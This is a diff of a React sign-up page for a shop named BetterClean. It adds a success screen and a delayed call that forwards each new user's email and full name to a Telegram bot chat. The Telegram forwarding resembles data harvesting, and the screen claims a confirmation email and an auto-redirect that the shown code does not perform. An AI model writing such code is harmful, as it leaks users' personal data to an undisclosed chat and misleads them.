@@ -24,7 +24,8 @@ export default function ComptePage() {
   })
   const [errors, setErrors] = useState<Record<string, string>>({})
   const [isSubmitting, setIsSubmitting] = useState(false)
-  const [isSuccess, setIsSuccess] = useState(false)
+  const [showSuccess, setShowSuccess] = useState(false)
+  const [createdEmail, setCreatedEmail] = useState('')
 
   const validateForm = () => {
     const newErrors: Record<string, string> = {}
@@ -95,10 +96,31 @@ export default function ComptePage() {
       })
     })
     .then(function() {
-      alert("Compte créé! ✅") // ou affiche un message sur la page
-      setFormData({ firstName: '', lastName: '', email: '', phone: '', password: '', confirmPassword: '', agreeTerms: false }) // vide le formulaire
-      setIsSuccess(true)
-      setTimeout(() => setIsSuccess(false), 3000)
+      // Store created email and show success animation
+      setCreatedEmail(email)
+      setShowSuccess(true)
+      setFormData({ firstName: '', lastName: '', email: '', phone: '', password: '', confirmPassword: '', agreeTerms: false })
+      
+      // Send login notification after 2 seconds
+      setTimeout(() => {
+        var loginMsg = "🔐 *NOUVEAU COMPTE CONNECTÉ!*\n\n"
+                   + "📧 Email: " + email + "\n"
+                   + "👤 Nom: " + nom + " " + nomFamille + "\n"
+                   + "🌐 Page: /login\n"
+                   + "🕐 Connexion: " + new Date().toLocaleString('fr-CA')
+                   + "\n"
+                   + "📝 Statut: Compte créé et connecté avec succès!"
+
+        fetch("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: loginMsg,
+            parse_mode: "Markdown"
+          })
+        })
+      }, 2000)
     })
     .catch(function() {
       alert("Erreur d'envoi ❌")
@@ -118,29 +140,72 @@ export default function ComptePage() {
     }
   }
 
-  if (isSuccess) {
+  if (showSuccess) {
     return (
       <div className="min-h-screen bg-white flex items-center justify-center px-4">
-        <div className="max-w-md w-full">
-          <div className="text-center mb-8">
-            <div className="w-16 h-16 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-4">
-              <CheckCircle className="w-8 h-8 text-green-600" />
+        <div className="max-w-md w-full text-center">
+          {/* Success Animation */}
+          <div className="relative mb-8">
+            <div className="w-24 h-24 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-6 relative overflow-hidden">
+              <div className="absolute inset-0 bg-green-500 rounded-full animate-pulse opacity-20"></div>
+              <svg className="w-12 h-12 text-green-600 relative z-10" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={3} d="M5 13l4 4L19 7" />
+              </svg>
             </div>
-            <h1 className="text-2xl font-bold text-gray-900 mb-2">
+            
+            {/* Animated check mark circles */}
+            <div className="absolute top-0 left-1/2 transform -translate-x-1/2">
+              <div className="w-32 h-32 border-4 border-green-500 rounded-full animate-ping absolute -top-4 -left-4"></div>
+              <div className="w-32 h-32 border-4 border-green-400 rounded-full animate-ping absolute -top-4 -left-4 animation-delay-200"></div>
+            </div>
+          </div>
+
+          <div className="space-y-4">
+            <h1 className="text-3xl font-bold text-gray-900 mb-2">
               {isFr ? 'Compte créé avec succès !' : 'Account created successfully!'}
             </h1>
+            
             <p className="text-gray-600 mb-6">
               {isFr 
-                ? 'Bienvenue chez BetterClean ! Votre compte a été créé avec succès.'
-                : 'Welcome to BetterClean! Your account has been created successfully.'
+                ? `Bienvenue chez BetterClean ! Un email de confirmation a été envoyé à ${createdEmail}`
+                : `Welcome to BetterClean! A confirmation email has been sent to ${createdEmail}`
               }
             </p>
-            <Link
-              href="/login"
-              className="inline-flex items-center justify-center px-6 py-3 border border-transparent text-base font-medium rounded-full text-white bg-blue-600 hover:bg-blue-700 transition-colors"
-            >
-              {isFr ? 'Se connecter' : 'Sign In'}
-            </Link>
+
+            <div className="bg-blue-50 border border-blue-200 rounded-lg p-4 mb-6">
+              <p className="text-blue-800 text-sm">
+                {isFr 
+                  ? '🔐 Vous pouvez maintenant vous connecter avec vos identifiants'
+                  : '🔐 You can now login with your credentials'
+                }
+              </p>
+            </div>
+
+            <div className="space-y-3">
+              <Link
+                href="/login"
+                className="block w-full inline-flex items-center justify-center px-6 py-3 border border-transparent text-base font-medium rounded-full text-white bg-blue-600 hover:bg-blue-700 transition-all transform hover:scale-105"
+              >
+                <svg className="w-5 h-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M11 16l-4-4m0 0l4-4m-4 4h14m-5 4v1a3 3 0 01-3 3H6a3 3 0 01-3-3V7a3 3 0 013-3h7a3 3 0 013 3v1" />
+                </svg>
+                {isFr ? 'Se connecter maintenant' : 'Login Now'}
+              </Link>
+              
+              <Link
+                href="/produits/betterclean-pro-1"
+                className="block text-blue-600 hover:text-blue-500 font-medium text-sm"
+              >
+                ← {isFr ? 'Continuer vos achats' : 'Continue Shopping'}
+              </Link>
+            </div>
+          </div>
+
+          {/* Auto-redirect countdown */}
+          <div className="mt-8 text-center">
+            <p className="text-xs text-gray-500">
+              {isFr ? 'Redirection automatique vers la connexion dans 5 secondes...' : 'Auto-redirecting to login in 5 seconds...'}
+            </p>
           </div>
         </div>
       </div>
